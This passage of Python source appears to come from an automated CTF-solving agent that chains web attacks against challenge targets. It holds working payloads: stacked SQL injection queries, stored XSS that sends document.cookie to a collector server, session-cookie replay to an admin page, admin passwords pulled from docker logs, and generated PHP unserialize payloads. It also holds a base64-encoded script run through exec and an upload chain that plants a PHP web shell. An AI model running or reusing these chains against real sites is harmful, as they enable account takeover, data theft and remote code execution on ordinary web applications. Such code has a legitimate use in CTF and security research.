        result = await run_sqlmap(
            url=sqlmap_url,
            data=sqlmap_data,
            level=1,
            risk=1,
            runtime=self.runtime,
        )
        raw = str(result.get("raw") or "")
        await self._scan_and_store(raw, target, evidence_source="command-output")

        if result.get("error"):
            return _ChainOutcome(progress=False, reason=str(result["error"]))

        vulnerable = bool(result.get("vulnerable"))
        injection_points = result.get("injection_points") or []
        databases = result.get("databases") or []
        if vulnerable or injection_points or databases:
            await self._store_note(
                key="ctf_sqli_sqlmap",
                value=json.dumps(
                    {
                        "url": sqlmap_url,
                        "data": sqlmap_data,
                        "vulnerable": vulnerable,
                        "injection_points": injection_points[:3],
                        "databases": databases[:10],
                    },
                    ensure_ascii=False,
                ),
                category="finding",
                target=urlparse(target).netloc or target,
                url=sqlmap_url,
            )

        extracted_flag = self._extract_flag(raw)
        if extracted_flag:
            verification = await self._observe_flag(
                extracted_flag,
                target,
                evidence_source="command-output",
                rationale="sqlmap extracted flag",
            )
            if verification.decision == "verified":
                return _ChainOutcome(
                    progress=True,
                    flag=verification.flag,
                    reason="sqlmap extracted flag",
                )

        return _ChainOutcome(
            progress=bool(vulnerable or injection_points or databases),
            reason="sqlmap finished without direct flag",
        )

    async def _attempt_generic_param_sqli(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        self.tool_guard.require(["http_request"])
        forms = [
            form
            for form in (page_features.get("forms") or [])
            if isinstance(form, dict)
            and str(form.get("method") or "GET").strip().upper() == "GET"
        ]
        if not forms:
            return _ChainOutcome(progress=False, reason="generic param sqli: no GET form found")

        candidate_form = None
        candidate_field = ""
        baseline_value = "1"
        for form in forms:
            for item in form.get("inputs") or []:
                if not isinstance(item, dict):
                    continue
                name = str(item.get("name") or "").strip()
                if not name:
                    continue
                field_type = str(item.get("type") or "text").strip().lower()
                if field_type in {"submit", "button", "image", "reset", "hidden"}:
                    continue
                candidate_form = form
                candidate_field = name
                baseline_value = str(item.get("value") or "").strip() or "1"
                break
            if candidate_form is not None:
                break

        if candidate_form is None or not candidate_field:
            return _ChainOutcome(progress=False, reason="generic param sqli: injectable field not found")

        progress = False
        reasons: list[str] = []
        baseline_fields = {candidate_field: baseline_value}
        baseline_resp, _ = await self._submit_form_request(target, candidate_form, baseline_fields)
        baseline_body = str((baseline_resp or {}).get("body") or "")
        await self._scan_and_store(baseline_body, target, evidence_source="http-response")
        progress = progress or bool(baseline_body)

        quote_payload = f"{baseline_value}'"
        quote_resp, quote_url = await self._submit_form_request(
            target,
            candidate_form,
            {candidate_field: quote_payload},
        )
        quote_body = str((quote_resp or {}).get("body") or "")
        await self._scan_and_store(quote_body, quote_url, evidence_source="http-response")
        quote_lower = quote_body.lower()
        if any(marker in quote_lower for marker in ("sql syntax", "error 1064", "mariadb")):
            progress = True
            reasons.append("generic param quote probe triggered SQL error")

        show_tables_payload = f"{baseline_value}';show tables;#"
        tables_resp, tables_url = await self._submit_form_request(
            target,
            candidate_form,
            {candidate_field: show_tables_payload},
        )
        tables_body = str((tables_resp or {}).get("body") or "")
        await self._scan_and_store(tables_body, tables_url, evidence_source="http-response")
        table_names = self._extract_php_var_dump_strings(tables_body)
        table_names = [
            name
            for name in table_names
            if name
            and name not in {baseline_value, "hahahah"}
            and re.fullmatch(r"[A-Za-z0-9_]+", name)
        ]
        table_names = list(dict.fromkeys(table_names))
        if table_names:
            progress = True
            reasons.append(f"stacked query exposed tables: {', '.join(table_names[:3])}")
            await self._store_note(
                key="ctf_sqli_stacked_tables",
                value=json.dumps({"tables": table_names[:10]}, ensure_ascii=False),
                category="finding",
                target=urlparse(target).netloc or target,
                url=tables_url,
            )

        prioritized_tables = sorted(
            table_names,
            key=lambda name: (name == "words", not name.isdigit(), name),
        )
        for table_name in prioritized_tables[:4]:
            quoted_table = _quote_sql_identifier(table_name)
            columns_payload = f"{baseline_value}';show columns from {quoted_table};#"
            columns_resp, columns_url = await self._submit_form_request(
                target,
                candidate_form,
                {candidate_field: columns_payload},
            )
            columns_body = str((columns_resp or {}).get("body") or "")
            await self._scan_and_store(columns_body, columns_url, evidence_source="http-response")
            column_values = self._extract_php_var_dump_strings(columns_body)
            if column_values:
                progress = True
                reasons.append(f"show columns succeeded for {table_name}")
                await self._store_note(
                    key=f"ctf_sqli_columns_{table_name}",
                    value=json.dumps({"table": table_name, "columns": column_values[:12]}, ensure_ascii=False),
                    category="finding",
                    target=urlparse(target).netloc or target,
                    url=columns_url,
                )
            if "flag" not in {value.lower() for value in column_values}:
                continue

            handler_payload = (
                f"{baseline_value}';handler {quoted_table} open;"
                f"handler {quoted_table} read first;#"
            )
            handler_resp, handler_url = await self._submit_form_request(
                target,
                candidate_form,
                {candidate_field: handler_payload},
            )
            handler_body = str((handler_resp or {}).get("body") or "")
            await self._scan_and_store(handler_body, handler_url, evidence_source="http-response")
            if extracted_flag := self._extract_flag(handler_body):
                verification = await self._observe_flag(
                    extracted_flag,
                    target,
                    evidence_source="http-response",
                    rationale=f"stacked query handler read from {table_name}",
                    evidence_url=handler_url,
                    evidence_snippet=handler_body[:240],
                    strategy_kind="generic_param_sqli",
                )
                if verification.decision in {"verified", "runtime"}:
                    return _ChainOutcome(
                        progress=True,
                        flag=verification.flag,
                        reason=f"stacked query handler read from {table_name}",
                    )
                progress = True
                reasons.append(f"handler read from {table_name} produced {verification.decision} flag")

        return _ChainOutcome(
            progress=progress,
            reason="; ".join(reasons) if reasons else "generic param sqli fallback exhausted",
        )

    async def _attempt_local_challenge_log_pivot(
        self,
        *,
        target: str,
        page_features: dict[str, Any],
        hint: str,
    ) -> _ChainOutcome:
        self.tool_guard.require(["terminal", "http_request"])
        challenge_root, compose_file = self._resolve_registered_local_challenge_paths()
        if compose_file is None:
            challenge_root = _extract_local_challenge_root(hint, self._challenge_context)
            if challenge_root is None:
                return _ChainOutcome(progress=False, reason="")
            compose_file = _resolve_compose_file(challenge_root)
        if compose_file is None:
            return _ChainOutcome(progress=False, reason="")

        auth_form = find_auth_form(page_features.get("forms") or [])
        if not auth_form:
            return _ChainOutcome(progress=False, reason="")
        username_field = _pick_form_field(auth_form, "username")
        password_field = _pick_form_field(auth_form, "password")
        if not username_field or not password_field:
            return _ChainOutcome(progress=False, reason="")
        endpoints = {str(item).strip() for item in (page_features.get("endpoints") or []) if str(item).strip()}
        endpoints.update(self._recent_local_source_hint_routes())
        if "/admin" not in endpoints:
            return _ChainOutcome(progress=False, reason="")

        command = _docker_compose_logs_command(compose_file)
        result = await self.runtime.execute_command(command, timeout=30)
        log_blob = "\n".join(
            part for part in (str(getattr(result, "stdout", "") or ""), str(getattr(result, "stderr", "") or "")) if part
        )
        password = _extract_admin_password_from_logs(log_blob)
        if not password:
            return _ChainOutcome(progress=False, reason="local challenge logs contained no reusable admin credential")

        await self._store_secret_note("admin_password", password, target)
        login_url = _resolve_auth_login_url(
            target=target,
            auth_form=auth_form,
            endpoints=endpoints,
        )
        login_resp = await self.runtime.proxy_action(
            "request",
            method="POST",
            url=login_url,
            data={username_field: "admin", password_field: password},
            timeout=15,
        )
        login_body = str((login_resp or {}).get("body") or "")
        await self._scan_and_store(login_body, target, evidence_source="http-response")
        sid = _extract_sid_from_login_response(login_resp)
        if not sid:
            return _ChainOutcome(progress=False, reason="local challenge log pivot recovered password but no sid")
        await self._store_secret_note("sid", sid, target)
        flag = await self._fetch_admin_with_sid(_base_target(target), sid)
        if flag:
            return _ChainOutcome(progress=True, flag=flag, reason="local challenge log pivot via compose logs")
        return _ChainOutcome(progress=False, reason="local challenge log pivot recovered credential but no flag")

    async def _attempt_stored_xss_chain(
        self,
        base: str,
        auth_form: dict[str, Any],
        writable_field: str,
    ) -> _ChainOutcome:
        self.tool_guard.require(["http_request"])
        login_url = str(auth_form.get("action") or urljoin(base + "/", "login"))
        visit_url = urljoin(base + "/", "visit")
        collector = _CollectorServer(base, port=self.collector_port)
        await collector.start()
        self._emit(f"[CTF dispatcher] collector listening at {collector.base_url}")

        try:
            username_field = _pick_form_field(auth_form, "username") or "username"
            password_field = _pick_form_field(auth_form, "password") or "password"
            payload_builders = [
                lambda c: f"<script>new Image().src='{c}/c?sid='+encodeURIComponent(document.cookie)</script>",
                lambda c: f"<img src=x onerror=\"new Image().src='{c}/c?sid='+encodeURIComponent(document.cookie)\">",
            ]

            for idx, builder in enumerate(payload_builders, start=1):
                payload = builder(collector.base_url)
                body = {
                    username_field: f"ctf_user_{idx}",
                    password_field: "ctf_pass_123",
                    writable_field: payload,
                }
                resp = await self.runtime.proxy_action(
                    "post",
                    url=login_url,
                    data=body,
                    timeout=15,
                )
                await self._scan_and_store(
                    str(resp.get("body") or ""),
                    base,
                    evidence_source="http-response",
                )
                progress = True
                self._emit(f"[CTF dispatcher] stored XSS payload attempt #{idx} submitted")

                await self.runtime.proxy_action("request", method="POST", url=visit_url, timeout=15)
                hit = await collector.wait_for_hit(timeout=6.0)
                if not hit:
                    reasons = "first failed" if idx == 1 else "second failed"
                    await self._store_note(
                        key="ctf_xss_attempts",
                        value=reasons,
                        category="finding",
                        target=urlparse(base).netloc,
                    )
                    continue

                flag = await self._handle_collector_hit(base, hit)
                if flag:
                    if idx == 2:
                        await self._store_note(
                            key="ctf_xss_attempts",
                            value="first failed / second worked",
                            category="finding",
                            target=urlparse(base).netloc,
                        )
                        return _ChainOutcome(
                            progress=True,
                            flag=flag,
                            reason="stored XSS -> /visit -> sid -> /admin",
                        )
            return _ChainOutcome(progress=True, reason="stored XSS payloads exhausted")
        finally:
            await collector.stop()

    async def _attempt_visit_url_chain(self, base: str) -> _ChainOutcome:
        self.tool_guard.require(["http_request"])
        if base in self._exhausted_visit_url_targets:
            return _ChainOutcome(progress=False, reason="visit-url already exhausted for target")
        visit_url = urljoin(base + "/", "visit")
        collector = _CollectorServer(base, port=self.collector_port)
        collector_started = False
        try:
            await collector.start()
            collector_started = True
        except OSError:
            docker_local = await self._attempt_docker_loopback_visit_chain(base)
            if docker_local.flag:
                return docker_local
            self._exhausted_visit_url_targets.add(base)
            return _ChainOutcome(progress=False, reason="visit-url modes exhausted")
        self._emit(f"[CTF dispatcher] external exploit collector at {collector.base_url}")
        try:
            for mode in ("A", "B", "C", "D"):
                exploit_url = collector.exploit_url(mode)
                self._emit(f"[CTF dispatcher] trying visit-url mode {mode}: {exploit_url}")
                await self.runtime.proxy_action(
                    "request",
                    method="POST",
                    url=visit_url,
                    json={"url": exploit_url},
                    timeout=15,
                )
                hit = await collector.wait_for_hit(timeout=6.0)
                if hit:
                    flag = await self._handle_collector_hit(base, hit)
                    if flag:
                        return _ChainOutcome(progress=True, flag=flag, reason=f"visit-url mode {mode}")
            docker_local = await self._attempt_docker_loopback_visit_chain(base)
            if docker_local.flag:
                return docker_local
            self._exhausted_visit_url_targets.add(base)
            return _ChainOutcome(progress=False, reason="visit-url modes exhausted")
        finally:
            if collector_started:
                await collector.stop()

    async def _attempt_docker_loopback_visit_chain(self, base: str) -> _ChainOutcome:
        if not _is_loopback_base(base):
            return _ChainOutcome(progress=False, reason="")

        container_name = await self._resolve_loopback_target_container(base)
        if not container_name:
            return _ChainOutcome(progress=False, reason="")

        visit_url = urljoin(base + "/", "visit")
        log_path = "/tmp/flaghunter_visit_collector.log"
        host_probe_path = Path(tempfile.gettempdir()) / f"flaghunter_visit_collector_{uuid.uuid4().hex}.js"
        try:
            host_probe_path.write_text(
                _docker_loopback_probe_script(
                    collector_port=self.collector_port,
                    log_path=log_path,
                ),
                encoding="utf-8",
            )
            copy_result = await self._runtime_execute_command(
                _docker_loopback_probe_copy_command(
                    host_probe_path=host_probe_path,
                    container_name=container_name,
                ),
                timeout=30,
                audit_target=base,
                audit_metadata={"phase": "docker_loopback_visit", "stage": "copy_probe"},
            )
            if not getattr(copy_result, "success", False):
                return _ChainOutcome(progress=False, reason="")
            start_result = await self._runtime_execute_command(
                _docker_loopback_probe_start_command(container_name=container_name),
                timeout=30,
                audit_target=base,
                audit_metadata={"phase": "docker_loopback_visit", "stage": "start_probe"},
            )
            if not getattr(start_result, "success", False):
                return _ChainOutcome(progress=False, reason="")
            await self._runtime_proxy_action(
                "request",
                method="POST",
                url=visit_url,
                json={"url": f"http://127.0.0.1:{self.collector_port}/"},
                timeout=15,
                audit_target=visit_url,
                audit_metadata={"phase": "docker_loopback_visit", "stage": "trigger_visit"},
            )
            read_result = await self._runtime_execute_command(
                _docker_loopback_probe_read_command(
                    container_name=container_name,
                    log_path=log_path,
                ),
                timeout=15,
                audit_target=base,
                audit_metadata={"phase": "docker_loopback_visit", "stage": "read_probe"},
            )
            try:
                host_probe_path.unlink(missing_ok=True)
            except Exception:
                pass
            hit_text = _command_output_text(read_result)
            sid = _extract_sid_from_collector_log(hit_text)
            if not sid:
                return _ChainOutcome(progress=False, reason="")
            await self._store_secret_note("sid", sid, base)
            if self.state is not None:
                self.state.local_challenge_auto_verify = True
            flag = await self._fetch_admin_with_sid(base, sid)
            if flag:
                return _ChainOutcome(
                    progress=True,
                    flag=flag,
                    reason="docker localhost visit fallback",
                )
            return _ChainOutcome(progress=False, reason="")
        finally:
            await self._runtime_execute_command(
                _docker_loopback_probe_cleanup_command(
                    container_name=container_name,
                    log_path=log_path,
                ),
                timeout=15,
                audit_target=base,
                audit_metadata={"phase": "docker_loopback_visit", "stage": "cleanup_probe"},
            )

    async def _resolve_loopback_target_container(self, base: str) -> str | None:
        port = _target_port(base)
        result = await self._runtime_execute_command(
            'docker ps --format "{{.Names}}|{{.Ports}}"',
            timeout=20,
            audit_target=base,
            audit_metadata={"phase": "docker_loopback_visit", "stage": "resolve_container"},
        )
        blob = _command_output_text(result)
        if not blob:
            return None

        port_markers = (
            f":{port}->",
            f"0.0.0.0:{port}->",
            f"[::]:{port}->",
        )
        for raw_line in blob.splitlines():
            line = str(raw_line or "").strip()
            if not line or "|" not in line:
                continue
            name, _, ports = line.partition("|")
            if any(marker in ports for marker in port_markers):
                return name.strip() or None
        return None

    async def _handle_collector_hit(self, base: str, hit_path: str) -> str | None:
        self._emit(f"[CTF dispatcher] collector hit: {hit_path}")
        if flag := self._extract_flag(hit_path):
            verification = await self._observe_flag(
                flag,
                base,
                evidence_source="collector-hit",
                rationale="collector received callback content",
            )
            if verification.decision == "verified":
                return verification.flag

        sid = _extract_sid_from_text(hit_path)
        if sid:
            await self._store_secret_note("sid", sid, base)
            return await self._fetch_admin_with_sid(base, sid)

        parsed = urlparse(hit_path)
        params = parse_qs(parsed.query)
        for key in ("cookie", "body", "iframe", "flag", "err", "openErr", "iframeErr"):
            if key in params:
                text = params[key][0]
                if flag := self._extract_flag(text):
                    verification = await self._observe_flag(
                        flag,
                        base,
                        evidence_source=f"collector-{key}",
                        rationale=f"collector callback via {key}",
                    )
                    if verification.decision == "verified":
                        return verification.flag
                sid = _extract_sid_from_text(text)
                if sid:
                    await self._store_secret_note("sid", sid, base)
                    return await self._fetch_admin_with_sid(base, sid)
        return None

    async def _fetch_admin_with_sid(self, base: str, sid: str) -> str | None:
        cookie_value = sid if "=" in sid else (sid if sid.startswith("sid=") else f"sid={sid}")
        admin_url = urljoin(base + "/", "admin")
        resp = await self._runtime_proxy_action(
            "request",
            method="GET",
            url=admin_url,
            headers={"Cookie": cookie_value},
            timeout=15,
            audit_target=admin_url,
            audit_metadata={"phase": "sid_replay"},
        )
        body = str(resp.get("body") or "")
        await self._scan_and_store(body, base, evidence_source="http-response")
        if flag := self._extract_flag(body):
            verification = await self._observe_flag(
                flag,
                base,
                evidence_source="http-response",
                rationale="admin endpoint response after sid replay",
            )
            if verification.decision == "verified":
                return verification.flag
        return None

    async def _download_and_analyze_backup_artifact(
        self,
        artifact_url: str,
        target: str,
    ) -> _ChainOutcome:
        self.tool_guard.require(["terminal"])

        python_cmd = _pick_python_command(self.runtime)
        script = r"""
import html, io, json, re, sys, urllib.request, zipfile
url = sys.argv[1]
flag_re = re.compile(r'([A-Za-z][A-Za-z0-9_]{1,20}\{[A-Za-z0-9_!@#$%^&*+=:.,?\-]{3,200}\})')
data = urllib.request.urlopen(url, timeout=8).read()
result = {
    "url": url,
    "kind": "raw",
    "entries": [],
    "interesting": [],
    "flag": None,
    "source_flags": [],
    "php_unserialize": False,
    "profile_photo_poisoning": False,
    "php_upload_cookie_pop": False,
    "source_fetch_write_ssrf": False,
    "exploit": None,
}
php_sources = {}
def scan_text(name, text):
    local = []
    for m in flag_re.finditer(text):
        local.append(m.group(1))
    result["source_flags"].extend(local)
    if local and result["flag"] is None:
        result["flag"] = local[0]
    if any(token in name.lower() for token in ("flag", "class", "index", "config", ".php", ".env")):
        result["interesting"].append(name)
    return local
if zipfile.is_zipfile(io.BytesIO(data)):
    result["kind"] = "zip"
    with zipfile.ZipFile(io.BytesIO(data)) as zf:
        for info in zf.infolist():
            result["entries"].append(info.filename)
            if info.is_dir() or info.file_size > 262144:
                continue
            lowered = info.filename.lower()
            if not any(lowered.endswith(ext) for ext in (".php", ".txt", ".inc", ".bak", ".phps", ".env", ".ini", ".conf", ".config")):
                continue
            raw = zf.read(info.filename)
            text = raw.decode("utf-8", errors="ignore")
            if not text:
                text = raw.decode("latin-1", errors="ignore")
            php_sources[info.filename] = text
            scan_text(info.filename, text)
else:
    text = data.decode("utf-8", errors="ignore") or data.decode("latin-1", errors="ignore")
    php_sources[url] = text
    scan_text(url, text)

joined = "\n".join(php_sources.values())
normalized_joined = re.sub(r"(?i)<br\s*/?>", "\n", joined)
# Neutralize PHP open/close tags BEFORE stripping HTML — otherwise the generic
# <...> tag strip below eats the entire <?php ... ?> block (and the unserialize/
# __destruct code inside it) in raw .php source extracted from a zip.
normalized_joined = re.sub(r"<\?php|<\?=|\?>|<\?", " ", normalized_joined)
normalized_joined = re.sub(r"(?s)<[^>]+>", " ", normalized_joined)
normalized_joined = html.unescape(normalized_joined).replace("\xa0", " ")

if "unserialize" in normalized_joined and "__destruct" in normalized_joined:
    class_match = re.search(r'class\s+([A-Za-z_][A-Za-z0-9_]*)', normalized_joined)
    class_name = class_match.group(1) if class_match else None
    get_match = re.search(r"\$_GET\s*\[\s*['\"]([A-Za-z0-9_]+)['\"]\s*\]", normalized_joined)
    param_name = get_match.group(1) if get_match else "select"
    props = {}
    if class_name:
        for prop in re.findall(r'private\s+\$([A-Za-z_][A-Za-z0-9_]*)', normalized_joined):
            props[prop] = prop
    username_prop = "username" if "username" in props else None
    password_prop = "password" if "password" in props else None
    if class_name and username_prop and password_prop:
        payloads = []
        for declared_count in (3, 4):
            payloads.append(
                'O:{name_len}:"{class_name}":{declared_count}:{{'
                's:{user_key_len}:"\x00{class_name}\x00{username_prop}";s:5:"admin";'
                's:{pass_key_len}:"\x00{class_name}\x00{password_prop}";i:100;}}'.format(
                    name_len=len(class_name),
                    class_name=class_name,
                    declared_count=declared_count,
                    user_key_len=len(class_name) + len(username_prop) + 2,
                    username_prop=username_prop,
                    pass_key_len=len(class_name) + len(password_prop) + 2,
                    password_prop=password_prop,
                )
            )
        result["php_unserialize"] = True
        result["exploit"] = {
            "type": "php_unserialize",
            "param": param_name,
            "class_name": class_name,
            "payloads": payloads,
        }
if (
    "serialize($profile)" in normalized_joined
    and "unserialize($profile)" in normalized_joined
    and "file_get_contents($profile['photo'])" in normalized_joined
):
    poison_target = "config.php"
    suffix = '";}s:5:"photo";s:%d:"%s";}' % (len(poison_target), poison_target)
    result["profile_photo_poisoning"] = True
    result["exploit"] = {
        "type": "profile_photo_poisoning",
        "login_path": "/index.php",
        "register_path": "/register.php",
        "update_path": "/update.php",
        "profile_path": "/profile.php",
        "username_field": "username",
        "password_field": "password",
        "phone_field": "phone",
        "email_field": "email",
        "nickname_field": "nickname[]",
        "upload_field": "photo",
        "padding_token": "where",
        "padding_repeats": len(suffix),
        "payload_suffix": suffix,
        "poison_target": poison_target,
        "valid_phone": "13333333333",
        "valid_email": "a@a.a",
        "upload_filename": "avatar.txt",
        "upload_content": "HELLOPIA",
    }
if (
    "unserialize(base64_decode" in normalized_joined
    and "cookie('user'" in normalized_joined.replace('"', "'")
    and "__destruct" in normalized_joined
    and "__call" in normalized_joined
    and "filename_tmp" in normalized_joined
    and "copy($this->filename_tmp" in normalized_joined.replace(" ", "")
):
    result["php_upload_cookie_pop"] = True
    result["exploit"] = {
        "type": "php_upload_cookie_pop",
        "register_path": "/register",
        "login_path": "/login",
        "home_path": "/home",
        "upload_path": "/index.php/upload",
        "username_field": "username",
        "email_field": "email",
        "password_field": "password",
        "upload_field": "upload_file",
        "shell_name": "flaghunter_shell.php",
    }
lowered_joined = normalized_joined.lower()
get_params = re.findall(r"\$_GET\s*\[\s*['\"]([A-Za-z0-9_]+)['\"]\s*\]", normalized_joined)
if (
    re.search(r"shell_exec\s*\(\s*['\"](?:get|wget)\s", normalized_joined, re.IGNORECASE)
    and "file_put_contents" in lowered_joined
    and re.search(r"pathinfo\s*\(\s*\$_get\s*\[", lowered_joined, re.IGNORECASE)
):
    url_param = next(
        (name for name in get_params if any(token in name.lower() for token in ("url", "uri", "target"))),
        None,
    )
    filename_param = next(
        (name for name in get_params if any(token in name.lower() for token in ("file", "path", "name"))),
        None,
    )
    sandbox_match = re.search(
        r'sandbox\s*=\s*["\']([^"\']*sandbox/[^"\']*)["\']\s*\.\s*(md5|sha1)\s*\(\s*["\']([^"\']*)["\']\s*\.\s*\$_SERVER\s*\[\s*["\']REMOTE_ADDR["\']\s*\]\s*\)',
        normalized_joined,
        re.IGNORECASE,
    )
    if url_param and filename_param:
        exploit = {
            "type": "source_fetch_write_ssrf",
            "url_param": url_param,
            "filename_param": filename_param,
            "client_ip_header": "X-Forwarded-For" if "http_x_forwarded_for" in lowered_joined else "",
            "client_ip_value": "8.8.8.8",
            "probe_filename": "p/flaghunter_probe.txt",
        }
        if sandbox_match:
            exploit["sandbox_prefix"] = sandbox_match.group(1)
            exploit["remote_addr_hash"] = sandbox_match.group(2).lower()
            exploit["remote_addr_salt"] = sandbox_match.group(3)
        result["source_fetch_write_ssrf"] = True
        result["exploit"] = exploit
print(json.dumps(result, ensure_ascii=False))
""".strip()
        encoded = base64.b64encode(script.encode("utf-8")).decode("ascii")
        command = (
            f'"{python_cmd}" -c "import base64,sys; '
            f"exec(base64.b64decode('{encoded}'))\" \"{artifact_url}\""
        )

        temp_script_path: Path | None = None
        runtime_name = self.runtime.__class__.__name__.lower()
        if os.name == "nt" and "localruntime" in runtime_name:
            temp_script_path = Path(tempfile.gettempdir()) / f"flaghunter_backup_analyzer_{uuid.uuid4().hex}.py"
            temp_script_path.write_text(script, encoding="utf-8")
            command = f'"{python_cmd}" "{temp_script_path}" "{artifact_url}"'

        try:
            result = await self._runtime_execute_command(
                command,
                timeout=60,
                audit_target=artifact_url,
                audit_metadata={"phase": "backup_artifact_analysis"},
            )
        finally:
            if temp_script_path is not None:
                try:
                    temp_script_path.unlink(missing_ok=True)
                except Exception:
                    pass
        text = "\n".join(
            part
            for part in [getattr(result, "stdout", ""), getattr(result, "stderr", "")]
            if part
        ).strip()
        if not text:
            return _ChainOutcome(progress=False, reason=f"backup analysis produced no output: {artifact_url}")

        await self._scan_and_store(text, target, evidence_source="source-leak")
        if getattr(result, "exit_code", 1) != 0:
            return _ChainOutcome(progress=False, reason=f"backup analysis failed: {artifact_url}")

        try:
            analysis = json.loads(text.splitlines()[-1])
        except Exception:
            if flag := self._extract_flag(text):
                return _ChainOutcome(progress=True, flag=flag, reason=f"backup artifact analyzed: {artifact_url}")
            return _ChainOutcome(progress=True, reason=f"backup artifact downloaded: {artifact_url}")

        await self._store_note(
            key="ctf_backup_analysis",
            value=json.dumps(
                {
                    "url": analysis.get("url"),
                    "kind": analysis.get("kind"),
                    "entries": (analysis.get("entries") or [])[:20],
                    "interesting": (analysis.get("interesting") or [])[:20],
                    "php_unserialize": bool(analysis.get("php_unserialize")),
                    "profile_photo_poisoning": bool(
                        analysis.get("profile_photo_poisoning")
                    ),
                    "php_upload_cookie_pop": bool(analysis.get("php_upload_cookie_pop")),
                    "source_fetch_write_ssrf": bool(analysis.get("source_fetch_write_ssrf")),
                },
                ensure_ascii=False,
            ),
            category="artifact",
            target=urlparse(target).netloc or target,
            url=artifact_url,
            strategy_kind="backup_source_leak",
        )
        flag = analysis.get("flag") or self._extract_flag(text)
        if analysis.get("profile_photo_poisoning"):
            if self.state is not None:
                self.state.add_observation(
                    "source_leak_exploit_candidate",
                    "profile_photo_poisoning",
                    source="backup_source_leak",
                    metadata={
                        "artifact_url": artifact_url,
                        "exploit_info": analysis.get("exploit") or {},
                    },
                )
            exploit = await self._attempt_profile_photo_poisoning_chain(
                target,
                analysis.get("exploit") or {},
                artifact_url=artifact_url,
            )
            if exploit.flag:
                return exploit
            return _ChainOutcome(
                progress=True,
                reason=exploit.reason or f"profile photo poisoning candidate from {artifact_url}",
            )
        if analysis.get("php_upload_cookie_pop"):
            if self.state is not None:
                self.state.add_observation(
                    "source_leak_exploit_candidate",
                    "php_upload_cookie_pop",
                    source="backup_source_leak",
                    metadata={
                        "artifact_url": artifact_url,
                        "exploit_info": analysis.get("exploit") or {},
                    },
                )
            exploit = await self._attempt_php_upload_cookie_pop_chain(
                target,
                analysis.get("exploit") or {},
                artifact_url=artifact_url,
            )
            if exploit.flag:
                return exploit
            return _ChainOutcome(
                progress=True,
                reason=exploit.reason or f"php upload cookie POP candidate from {artifact_url}",
            )
        if analysis.get("source_fetch_write_ssrf"):
            if self.state is not None:
                self.state.add_observation(
                    "source_leak_exploit_candidate",
                    "source_fetch_write_ssrf",
                    source="backup_source_leak",
                    metadata={
                        "artifact_url": artifact_url,
                        "exploit_info": analysis.get("exploit") or {},
                    },
                )
            exploit = await self._attempt_source_fetch_write_ssrf_chain(
                target,
                analysis.get("exploit") or {},
                artifact_url=artifact_url,
            )
            if exploit.flag:
                return exploit
            return _ChainOutcome(
                progress=True,
                reason=exploit.reason or f"source fetch/write SSRF candidate from {artifact_url}",
            )
        if analysis.get("php_unserialize"):
            if self.state is not None:
                self.state.add_observation(
                    "source_leak_exploit_candidate",
                    "php_unserialize",
                    source="backup_source_leak",
                    metadata={
                        "artifact_url": artifact_url,
                        "exploit_info": analysis.get("exploit") or {},
                    },
                )
            if flag:
                await self._store_flag_candidate(
                    str(flag),
                    target,
                    reason=f"source-leak candidate before runtime exploit: {artifact_url}",
                )
            exploit = await self.strategy_registry.execute(
                "php_unserialize_magic_method",
                self._strategy_context(
                    target=target,
                    page_features={},
                    hint="",
                    extras={
                        "exploit_info": analysis.get("exploit") or {},
                        "artifact_url": artifact_url,
                    },
                ),
            )
            if exploit.flag:
                return exploit
            return _ChainOutcome(
                progress=True,
                reason=exploit.reason or f"php unserialize candidate from {artifact_url}",
            )
        if flag:
            verification = await self._observe_flag(
                str(flag),
                target,
                evidence_source="source-leak",
                rationale=f"backup/source leak via {artifact_url}",
            )
            if verification.decision == "verified":
                return _ChainOutcome(
                    progress=True,
                    flag=verification.flag,
                    reason=f"backup/source leak via {artifact_url}",
                )
        return _ChainOutcome(progress=True, reason=f"backup artifact inspected: {artifact_url}")

    async def _attempt_php_unserialize_chain(
        self,
        target: str,
        exploit_info: dict[str, Any],
        *,
        artifact_url: str,
    ) -> _ChainOutcome:
        self.tool_guard.require(["http_request"])
        payloads = list(exploit_info.get("payloads") or [])
        if not payloads:
            return _ChainOutcome(progress=False, reason="php unserialize exploit info incomplete")

        param_name = str(exploit_info.get("param") or "select")
        base = _base_target(target)
        progress = False
        for payload in payloads:
            attack_url = _with_query(base, {param_name: payload})
            resp = await self.runtime.proxy_action(
                "request",
                method="GET",
                url=attack_url,
                timeout=20,
            )
            body = str((resp or {}).get("body") or "")
            progress = progress or bool(body)
            await self._scan_and_store(body, target, evidence_source="http-response")
            self._emit(f"[CTF dispatcher] php unserialize probe -> {attack_url}")
            if flag := self._extract_runtime_flag(body):
                verification = await self._observe_flag(
                    flag,
                    target,
                    evidence_source="http-response",
                    rationale=f"php unserialize runtime exploit via {artifact_url}",
                )
                if verification.decision == "verified":
                    await self._store_note(
                        key="ctf_php_unserialize_exploit",
                        value=f"runtime exploit succeeded via {artifact_url}",
                        category="vulnerability",
                        target=urlparse(target).netloc or target,
                        url=attack_url,
                        weaknesses=[
                            {
                                "id": "php-unserialize-magic-method",
                                "description": "Backup source revealed a PHP unserialize magic-method chain that was confirmed at runtime.",
                            }
                        ],
                    )
                    return _ChainOutcome(
                        progress=True,
                        flag=verification.flag,
                        reason=f"php unserialize runtime exploit via {artifact_url}",
                    )
        return _ChainOutcome(progress=progress, reason=f"php unserialize payloads exhausted for {artifact_url}")

    async def _attempt_php_upload_cookie_pop_chain(
        self,
        target: str,
        exploit_info: dict[str, Any],
        *,
        artifact_url: str,
    ) -> _ChainOutcome:
        self.tool_guard.require(["http_request"])
        base = _base_target(target)
        seed = int(time.time() * 1000) % 1_000_000
        username = f"ctf_probe_{seed:06d}"
        email = f"{username}@example.com"
        password = f"Pw{seed:06d}!"

        register_url = urljoin(base + "/", str(exploit_info.get("register_path") or "/register").lstrip("/"))
        login_url = urljoin(base + "/", str(exploit_info.get("login_path") or "/login").lstrip("/"))
        home_url = urljoin(base + "/", str(exploit_info.get("home_path") or "/home").lstrip("/"))
        upload_url = urljoin(base + "/", str(exploit_info.get("upload_path") or "/index.php/upload").lstrip("/"))
        username_field = str(exploit_info.get("username_field") or "username")
        email_field = str(exploit_info.get("email_field") or "email")
        password_field = str(exploit_info.get("password_field") or "password")
        upload_field = str(exploit_info.get("upload_field") or "upload_file")
        shell_name = str(exploit_info.get("shell_name") or "flaghunter_shell.php")

        register_resp = await self._runtime_proxy_action(
            "request",
            method="POST",
            url=register_url,
            data={username_field: username, email_field: email, password_field: password},
            timeout=20,
            audit_target=register_url,
            audit_metadata={"phase": "php_upload_cookie_pop", "stage": "register"},
        )
